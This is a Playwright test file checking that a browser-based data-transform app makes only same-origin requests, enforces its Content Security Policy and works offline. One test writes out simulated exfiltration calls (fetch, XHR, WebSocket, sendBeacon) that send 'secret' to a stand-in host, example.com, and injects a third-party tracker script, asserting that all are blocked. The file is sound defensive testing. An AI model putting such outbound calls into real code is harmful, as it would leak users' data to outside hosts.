import {
  addStep,
  expect,
  saveTemplate,
  setInput,
  templateLinks,
  test,
  trackCspViolations,
} from './fixtures';

test('every page-load request is same-origin', async ({ page, baseURL }) => {
  const urls: string[] = [];
  page.on('request', (r) => urls.push(r.url()));
  await page.goto('/');
  await expect(page.getByTestId('input')).toBeVisible();
  await page.evaluate(() => document.fonts.ready);
  expect(urls.length).toBeGreaterThan(0);
  for (const url of urls) expect(new URL(url).origin).toBe(new URL(baseURL!).origin);
});

test('no requests after load while using the app', async ({ page }) => {
  await page.goto('/#/chain');
  await expect(page.getByTestId('input')).toBeVisible();
  await page.evaluate(() => document.fonts.ready);
  await page.waitForLoadState('networkidle');

  const urls: string[] = [];
  page.on('request', (r) => urls.push(r.url()));
  await addStep(page, 'b64 dec');
  await addStep(page, 'json format');
  await setInput(page, 'eyJhIjoxfQ==');
  await expect(page.getByTestId('output')).toHaveValue('{\n  "a": 1\n}');
  await page.getByTestId('peek-toggle').first().click();
  await saveTemplate(page, 'Private');
  await templateLinks(page).first().click();
  await page.getByTestId('swap').click();
  await page.waitForTimeout(500);
  expect(urls).toEqual([]);
});

test('script-initiated requests are blocked by the CSP', async ({ page }) => {
  const violations = await trackCspViolations(page);
  const leaked: string[] = [];
  await page.route('**/example.com/**', (route) => {
    leaked.push(route.request().url());
    return route.abort();
  });
  await page.goto('/#/chain');
  await expect(page.getByTestId('input')).toBeVisible();

  const results = await page.evaluate(async () => {
    const out: Record<string, string> = {};
    try {
      await fetch('https://example.com/collect', { method: 'POST', body: 'secret' });
      out.fetch = 'sent';
    } catch {
      out.fetch = 'blocked';
    }
    out.xhr = await new Promise<string>((resolve) => {
      const x = new XMLHttpRequest();
      x.onload = () => resolve('sent');
      x.onerror = () => resolve('blocked');
      try {
        x.open('POST', 'https://example.com/xhr');
        x.send('secret');
      } catch {
        resolve('blocked');
      }
    });
    try {
      new WebSocket('wss://example.com/ws');
      out.ws = 'created';
    } catch {
      out.ws = 'blocked';
    }
    navigator.sendBeacon('https://example.com/beacon', 'secret');
    await new Promise((r) => setTimeout(r, 300));
    return out;
  });

  expect(results.fetch).toBe('blocked');
  expect(results.xhr).toBe('blocked');
  const v = await violations();
  expect(v.some((x) => x.startsWith('connect-src https://example.com/collect'))).toBe(true);
  expect(v.some((x) => x.startsWith('connect-src https://example.com/xhr'))).toBe(true);
  expect(v.some((x) => x.startsWith('connect-src') && x.includes('wss://example.com'))).toBe(true);
  expect(v.some((x) => x.startsWith('connect-src https://example.com/beacon'))).toBe(true);
  expect(leaked).toEqual([]);
});

test('a third-party script tag is refused', async ({ page }) => {
  const violations = await trackCspViolations(page);
  await page.goto('/#/chain');
  await expect(page.getByTestId('input')).toBeVisible();
  const loaded = await page.evaluate(
    () =>
      new Promise<boolean>((resolve) => {
        const s = document.createElement('script');
        s.src = 'https://cdn.example.com/tracker.js';
        s.onload = () => resolve(true);
        s.onerror = () => resolve(false);
        document.head.append(s);
      }),
  );
  expect(loaded).toBe(false);
  expect((await violations()).some((x) => x.includes('cdn.example.com'))).toBe(true);
});

test('works offline after load', async ({ page, context }) => {
  await page.goto('/#/chain');
  await expect(page.getByTestId('input')).toBeVisible();
  await page.evaluate(() => document.fonts.ready);
  await context.setOffline(true);
  await addStep(page, 'b64 enc');
  await setInput(page, 'héllo');
  await expect(page.getByTestId('output')).toHaveValue('aMOpbGxv');
  await saveTemplate(page, 'Offline');
  await expect(templateLinks(page)).toHaveText(['Offline']);
});
